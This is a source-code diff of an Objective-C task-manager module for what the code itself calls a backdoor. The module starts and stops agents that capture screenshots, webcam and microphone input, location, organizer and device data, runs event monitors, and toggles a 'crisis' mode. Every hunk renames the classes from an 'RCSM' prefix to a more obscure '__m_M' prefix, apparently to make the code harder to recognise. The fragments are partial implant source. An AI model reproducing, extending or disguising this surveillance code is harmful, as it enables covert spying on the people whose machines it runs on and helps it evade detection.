@@ -39,7 +39,7 @@
 
 #define MAX_RETRY_TIME     6
 
-static RCSMTaskManager *sharedTaskManager = nil;
+static __m_MTaskManager *sharedTaskManager = nil;
 static NSLock *gTaskManagerLock           = nil;
 static NSLock *gSyncLock                  = nil;
 
@@ -47,7 +47,7 @@ static NSLock *gSyncLock                  = nil;
 #pragma mark Public Implementation
 #pragma mark -
 
-@implementation RCSMTaskManager
+@implementation __m_MTaskManager
 
 @synthesize mEventsList;
 @synthesize mActionsList;
@@ -61,7 +61,7 @@ static NSLock *gSyncLock                  = nil;
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMTaskManager *)sharedInstance
++ (__m_MTaskManager *)sharedInstance
 {
 @synchronized(self)
   {
@@ -119,10 +119,10 @@ static NSLock *gSyncLock                  = nil;
               
               mShouldReloadConfiguration = FALSE;
               
-              mConfigManager = [[RCSMConfManager alloc] initWithBackdoorName:
+              mConfigManager = [[__m_MConfManager alloc] initWithBackdoorName:
                                 [[[NSBundle mainBundle] executablePath] lastPathComponent]];
               
-              mActions = [[RCSMActions alloc] init];
+              mActions = [[__m_MActions alloc] init];
               gTaskManagerLock  = [[NSLock alloc] init];
               mIsSyncing        = NO;
               sharedTaskManager = self;
@@ -274,7 +274,7 @@ static NSLock *gSyncLock                  = nil;
       [[NSFileManager defaultManager] removeItemAtPath: configurationUpdatePath
                                                  error: nil];
 
-      RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+      __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
       [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
       [infoManager release];
     }
@@ -314,7 +314,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                   infoLog(@"loadConfiguration was ok");
 #endif
-                  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
                   [infoManager logActionWithDescription: @"New configuration activated"];
                   [infoManager release];
 
@@ -346,7 +346,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                   infoLog(@"An error occurred while reloading the configuration file");
 #endif
-                  RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                  __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
                   [infoManager logActionWithDescription: @"Invalid new configuration, reverting"];
                   [infoManager release];
 
@@ -421,7 +421,7 @@ static NSLock *gSyncLock                  = nil;
   infoLog(@"Closing active logs");
 #endif
 
-  RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
+  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
   if ([_logManager closeActiveLogsAndContinueLogging: NO])
     {
 #ifdef DEBUF
@@ -650,10 +650,10 @@ static NSLock *gSyncLock                  = nil;
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
   // Disable agent start on global quota exceded
-  if ([[RCSMDiskQuota sharedInstance] isQuotaReached] == YES)
+  if ([[__m_MDiskQuota sharedInstance] isQuotaReached] == YES)
     return NO;
     
-  RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
+  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
   
   NSMutableDictionary *agentConfiguration = nil;
   NSMutableData *agentCommand             = nil;
@@ -665,7 +665,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
         infoLog(@"Starting Agent Screenshot");
 #endif
-        RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
+        __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if (agentConfiguration != nil)
@@ -702,7 +702,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
         infoLog(@"Starting Agent Organizer");
 #endif
-        RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
+        __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if (agentConfiguration == nil)
@@ -728,7 +728,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
         infoLog(@"Starting Agent Webcam");
 #endif
-        RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
+        __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
         
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
@@ -1146,7 +1146,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
         infoLog(@"Starting Agent Position");
 #endif
-        RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+        __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
         if (agentConfiguration != nil)
@@ -1183,7 +1183,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
         infoLog(@"Starting Agent Device");
 #endif
-        RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+        __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
         if (agentConfiguration != nil)
@@ -1219,7 +1219,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
         infoLog(@"Starting Agent Microphone");
 #endif
-        RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+        __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
         agentConfiguration = [[self getConfigForAgent: agentID] retain];
         
         if (agentConfiguration != nil)
@@ -1340,7 +1340,7 @@ static NSLock *gSyncLock                  = nil;
         infoLog(@"Agent Crisis 0x%x", gAgentCrisis);
 #endif
         
-        RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+        __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
         [infoManager logActionWithDescription: @"Crisis started"];
         [infoManager release];
         
@@ -1547,7 +1547,7 @@ static NSLock *gSyncLock                  = nil;
 
 - (BOOL)stopAgent: (u_int)agentID
 {
-  RCSMLogManager *_logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *_logManager = [__m_MLogManager sharedInstance];
   NSMutableDictionary *agentConfiguration;
   NSData *agentCommand;
   
@@ -1562,7 +1562,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
         infoLog(@"Stopping Agent Screenshot");
 #endif
-        RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
+        __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
         
         if ([agentScreenshot stop] == FALSE)
           {
@@ -1582,7 +1582,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
         warnLog(@"Stopping Agent Organizer");
 #endif
-        RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
+        __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
       
         if ([agentOrganizer stop] == FALSE)
           {
@@ -1605,7 +1605,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
         infoLog(@"Stopping Agent WebCam");
 #endif
-        RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
+        __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
         
         if ([agentWebcam stop] == FALSE)
           {
@@ -1855,7 +1855,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
         infoLog(@"Stopping Agent Position");
 #endif
-        RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+        __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
         
         if ([agentPosition stop] == FALSE)
           {
@@ -1871,7 +1871,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
         infoLog(@"Stopping Agent Microphone");
 #endif
-        RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+        __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
         
         if ([agentMic stop] == FALSE)
           {
@@ -1891,7 +1891,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
         infoLog(@"Stopping Agent Device");
 #endif
-        RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+        __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
 
         if ([agentDevice stop] == FALSE)
           {
@@ -1918,7 +1918,7 @@ static NSLock *gSyncLock                  = nil;
         infoLog(@"Agent Crisis 0x%x (0x%x)", gAgentCrisis, ~(CRISIS_STARTSTOP));
 #endif
         
-        RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+        __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
         [infoManager logActionWithDescription: @"Crisis stopped"];
         [infoManager release];
         
@@ -1976,7 +1976,7 @@ static NSLock *gSyncLock                  = nil;
 - (BOOL)startAgents
 {
   NSAutoreleasePool *outerPool    = [[NSAutoreleasePool alloc] init];
-  RCSMLogManager    *_logManager  = [RCSMLogManager sharedInstance];
+  __m_MLogManager    *_logManager  = [__m_MLogManager sharedInstance];
   
 #ifdef DEBUG_TASK_MANAGER
   infoLog(@"Start all Agents called");
@@ -2007,7 +2007,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Screenshot");
 #endif
-                RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
+                __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
                 
                 if ([agentConfiguration isKindOfClass: [NSString class]])
@@ -2035,7 +2035,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Organizer");
 #endif
-                RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
+                __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
                 
                 [anObject setObject: AGENT_START
@@ -2053,7 +2053,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Webcam");
 #endif
-                RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
+                __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
                 
                 if ([agentConfiguration isKindOfClass: [NSString class]])
@@ -2432,7 +2432,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Position");
 #endif
-                RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+                __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
                 agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
                 if (agentConfiguration != nil)
@@ -2469,7 +2469,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Device");
 #endif
-                RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+                __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
                 agentConfiguration = [[self getConfigForAgent: agentID] retain];
 
                 if (agentConfiguration != nil)
@@ -2505,7 +2505,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Starting Agent Microphone");
 #endif
-                RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+                __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
                 agentConfiguration = [[anObject objectForKey: @"data"] retain];
                 
                 if ([agentConfiguration isKindOfClass: [NSString class]])
@@ -2615,7 +2615,7 @@ static NSLock *gSyncLock                  = nil;
 #endif
                 gAgentCrisis |= CRISIS_START;                
 
-                RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
                 [infoManager logActionWithDescription: @"Crisis starting"];
                 [infoManager release];
                 
@@ -2713,7 +2713,7 @@ static NSLock *gSyncLock                  = nil;
 - (BOOL)stopAgents
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  RCSMLogManager *_logManager  = [RCSMLogManager sharedInstance];
+  __m_MLogManager *_logManager  = [__m_MLogManager sharedInstance];
   
 #ifdef DEBUG_TASK_MANAGER
   infoLog(@"Stop all Agents called");
@@ -2740,7 +2740,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Stopping Agent Screenshot");
 #endif
-                RCSMAgentScreenshot *agentScreenshot = [RCSMAgentScreenshot sharedInstance];
+                __m_MAgentScreenshot *agentScreenshot = [__m_MAgentScreenshot sharedInstance];
                 
                 if ([agentScreenshot stop] == FALSE)
                   {
@@ -2760,7 +2760,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
                 warnLog(@"Stopping Agent Organizer");
 #endif
-                RCSMAgentOrganizer *agentOrganizer = [RCSMAgentOrganizer sharedInstance];
+                __m_MAgentOrganizer *agentOrganizer = [__m_MAgentOrganizer sharedInstance];
               
                 if ([agentOrganizer stop] == FALSE)
                   {
@@ -2783,7 +2783,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Stopping Agent WebCam");
 #endif
-                RCSMAgentWebcam *agentWebcam = [RCSMAgentWebcam sharedInstance];
+                __m_MAgentWebcam *agentWebcam = [__m_MAgentWebcam sharedInstance];
               
                 if ([agentWebcam stop] == FALSE)
                   {
@@ -2999,7 +2999,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
                 infoLog(@"Stopping Agent Position");
 #endif
-                RCSMAgentPosition *agentPosition = [RCSMAgentPosition sharedInstance];
+                __m_MAgentPosition *agentPosition = [__m_MAgentPosition sharedInstance];
                 
                 if ([agentPosition stop] == FALSE)
                   {
@@ -3019,7 +3019,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER        
                 infoLog(@"Stopping Agent Device");
 #endif
-                RCSMAgentDevice *agentDevice = [RCSMAgentDevice sharedInstance];
+                __m_MAgentDevice *agentDevice = [__m_MAgentDevice sharedInstance];
 
                 if ([agentDevice stop] == FALSE)
                   {
@@ -3039,7 +3039,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
                 infoLog(@"Stopping Agent Microphone");
 #endif
-                RCSMAgentMicrophone *agentMic = [RCSMAgentMicrophone sharedInstance];
+                __m_MAgentMicrophone *agentMic = [__m_MAgentMicrophone sharedInstance];
                 
                 if ([agentMic stop] == FALSE)
                   {
@@ -3062,7 +3062,7 @@ static NSLock *gSyncLock                  = nil;
 #endif
                 gAgentCrisis &= ~(CRISIS_STARTSTOP);
 
-                RCSMInfoManager *infoManager = [[RCSMInfoManager alloc] init];
+                __m_MInfoManager *infoManager = [[__m_MInfoManager alloc] init];
                 [infoManager logActionWithDescription: @"Crisis stopped"];
                 [infoManager release];
                 
@@ -3145,7 +3145,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"EVENT TIMER FOUND! Starting monitor Thread");
 #endif
-            RCSMEvents *events = [RCSMEvents sharedEvents];
+            __m_MEvents *events = [__m_MEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventTimer:)
                                      toTarget: events
                                    withObject: anObject];
@@ -3156,7 +3156,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"EVENT Process FOUND! Starting monitor Thread");
 #endif
-            RCSMEvents *events = [RCSMEvents sharedEvents];
+            __m_MEvents *events = [__m_MEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventProcess:)
                                      toTarget: events
                                    withObject: anObject];
@@ -3167,7 +3167,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"EVENT Connection FOUND! Starting monitor Thread");
 #endif
-            RCSMEvents *events = [RCSMEvents sharedEvents];
+            __m_MEvents *events = [__m_MEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventConnection:)
                                      toTarget: events
                                    withObject: anObject];
@@ -3178,7 +3178,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"EVENT Screensaver FOUND! Starting monitor Thread");
 #endif
-            RCSMEvents *events = [RCSMEvents sharedEvents];
+            __m_MEvents *events = [__m_MEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventScreensaver:)
                                      toTarget: events
                                    withObject: anObject];
@@ -3191,7 +3191,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
             infoLog(@"EVENT quota FOUND! Starting monitor Thread");
 #endif
-            RCSMEvents *events = [RCSMEvents sharedEvents];
+            __m_MEvents *events = [__m_MEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventQuota:)
                                      toTarget: events
                                    withObject: anObject];
@@ -3202,7 +3202,7 @@ static NSLock *gSyncLock                  = nil;
 #ifdef DEBUG_TASK_MANAGER
           infoLog(@"EVENT idle FOUND! Starting monitor Thread");
 #endif
-            RCSMEvents *events = [RCSMEvents sharedEvents];
+            __m_MEvents *events = [__m_MEvents sharedEvents];
             [NSThread detachNewThreadSelector: @selector(eventIdle:)
                                      toTarget: events
                                    withObject: anObject];
